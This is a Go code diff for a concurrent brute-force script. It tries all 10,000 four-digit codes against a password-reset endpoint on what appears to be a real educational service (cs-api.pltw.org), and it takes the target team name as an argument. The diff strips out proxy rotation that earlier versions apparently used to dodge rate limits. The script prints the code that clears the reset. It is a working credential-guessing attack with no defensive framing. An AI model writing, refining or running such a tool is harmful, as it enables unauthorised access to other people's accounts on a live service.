@@ -7,147 +7,83 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"net/url"
 	"os"
 	"strings"
 	"sync"
 	"time"
 )
 
-func testProxy(proxyStr string) bool {
-	proxyURL, err := url.Parse("http://" + proxyStr)
-	if err != nil {
-		return false
-	}
-
-	client := &http.Client{
-		Transport: &http.Transport{
-			Proxy: http.ProxyURL(proxyURL),
-		},
-	}
-
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-	defer cancel()
-
-	req, _ := http.NewRequestWithContext(ctx, "GET", "https://example.com", nil)
-	resp, err := client.Do(req)
-	if err != nil {
-		if strings.Contains(err.Error(), "context deadline exceeded") {
-			return false
-		}
-		return false
-	}
-	defer resp.Body.Close()
-	io.ReadAll(resp.Body)
-
-	return resp.StatusCode == 200
-}
-
-func readProxies(file string) ([]string, error) {
-	content, err := os.ReadFile(file)
-	if err != nil {
-		return nil, err
-	}
-
-	lines := bytes.Split(content, []byte("\n"))
-	proxies := make([]string, 0, len(lines))
-	for _, line := range lines {
-		trimmed := bytes.TrimSpace(line)
-		if len(trimmed) > 0 {
-			proxies = append(proxies, string(trimmed))
-		}
-	}
-	return proxies, nil
-}
-
-func filterWorkingProxies(proxies []string) []string {
-	var wg sync.WaitGroup
-	var mu sync.Mutex
-	working := make([]string, 0, len(proxies))
-
-	for _, proxy := range proxies {
-		wg.Add(1)
-		go func(p string) {
-			defer wg.Done()
-			if testProxy(p) {
-				mu.Lock()
-				working = append(working, p)
-				mu.Unlock()
-			} else {
-				// fmt.Println("❌ Proxy failed or timed out:", p, "")
-			}
-		}(proxy)
-	}
-
-	wg.Wait()
-	return working
-}
-
 func main() {
-	proxies, err := readProxies("proxies.txt")
-	if err != nil {
-		panic(err)
-	}
+	// proxies, err := readProxies("proxies.txt")
+	// if err != nil {
+	// 	panic(err)
+	// }
 
-	fmt.Println("Testing proxies... ")
+	// fmt.Println("Testing proxies... ")
 
-	
-	proxies = filterWorkingProxies(proxies)
-	fmt.Println("Working proxies:", len(proxies), "")
+	// proxies = filterWorkingProxies(proxies)
+	// fmt.Println("Working proxies:", len(proxies), "")
 
-	if len(proxies) == 0 {
-		fmt.Println("No working proxies found. Exiting ")
-		return
-	}
+	// if len(proxies) == 0 {
+	// 	fmt.Println("No working proxies found. Exiting ")
+	// 	return
+	// }
 
+	teamName := "joeteam"
 	if len(os.Args) > 1 {
-		fmt.Println("First user argument:", os.Args[1])
+		teamName = os.Args[1]
+		fmt.Print(os.Args[1], " code is ")
+	} else {
+		fmt.Println("No team name!")
+		os.Exit(1)
 	}
 
+	threadCount := 20
 	totalCodes := 9999
-	chunkSize := totalCodes / len(proxies) // divide codes among proxies
+	chunkSize := totalCodes / threadCount // divide codes among proxies
 	var wg sync.WaitGroup
 	sem := make(chan struct{}, 50) // concurrency limit
 
-	for i, proxy := range proxies {
+	for i := range threadCount {
 		start := i * chunkSize
 		end := start + chunkSize - 1
-		if i == len(proxies)-1 {
+		if i == threadCount-1 {
 			end = totalCodes - 1 // make sure last proxy goes to the end
 		}
 
 		wg.Add(1)
-		go func(proxy string, start, end int) {
-			for {
-				for code := start; code <= end; code++ {
-					sem <- struct{}{} // acquire slot
-					err := sendRequest(code, proxy)
-					<-sem // release slot
-	
-					if err != nil {
-						if strings.Contains(err.Error(), "context deadline exceeded") {
-//							fmt.Println("⏱️ Proxy timed out:", proxy)
-							return
-						}
+		go func(start, end int) {
+			defer wg.Done()
+			for code := start; code <= end; code++ {
+				sem <- struct{}{} // acquire slot
+				err := sendRequest(code, teamName)
+				<-sem // release slot
+
+				if err != nil {
+					if strings.Contains(err.Error(), "context deadline exceeded") {
+						//							fmt.Println("⏱️ Proxy timed out:", proxy)
+						return
 					}
 				}
 			}
-		}(proxy, start, end)
+		}(start, end)
 	}
 
 	wg.Wait()
+
+	fmt.Print("unknown; it does not exist.\n")
 }
 
-func sendRequest(code int, proxyStr string) error {
-	proxyURL, err := url.Parse("http://" + proxyStr)
-	if err != nil {
-		return err
-	}
+func sendRequest(code int, team string) error {
+	// proxyURL, err := url.Parse("http://" + proxyStr)
+	// if err != nil {
+	// 	return err
+	// }
 
 	client := &http.Client{
-		Transport: &http.Transport{
-			Proxy: http.ProxyURL(proxyURL),
-		},
+		// Transport: &http.Transport{
+		// 	Proxy: http.ProxyURL(proxyURL),
+		// },
 	}
 
 	payload := map[string]string{}
@@ -157,7 +93,9 @@ func sendRequest(code int, proxyStr string) error {
 		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 		defer cancel()
 
-		req, _ := http.NewRequestWithContext(ctx, "POST", fmt.Sprintf("https://cs-api.pltw.org/TeamUserName/reset?password=%d", code), bytes.NewBuffer(data))
+		fmturl := fmt.Sprintf("https://cs-api.pltw.org/%s/reset?password=%04d", team, code)
+		// fmt.Println(fmturl)
+		req, _ := http.NewRequestWithContext(ctx, "POST", fmturl, bytes.NewBuffer(data))
 		req.Header.Set("Content-Type", "application/json")
 
 		resp, err := client.Do(req)
@@ -175,8 +113,9 @@ func sendRequest(code int, proxyStr string) error {
 		body, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 
-		if !strings.Contains(string(body), "not cleared") {
-			fmt.Println(code, string(body))
+		if strings.Contains(string(body), "has been cleared") {
+			fmt.Print(fmt.Sprintf("%04d", code), ".\n")
+			os.Exit(0)
 		}
 
 		break
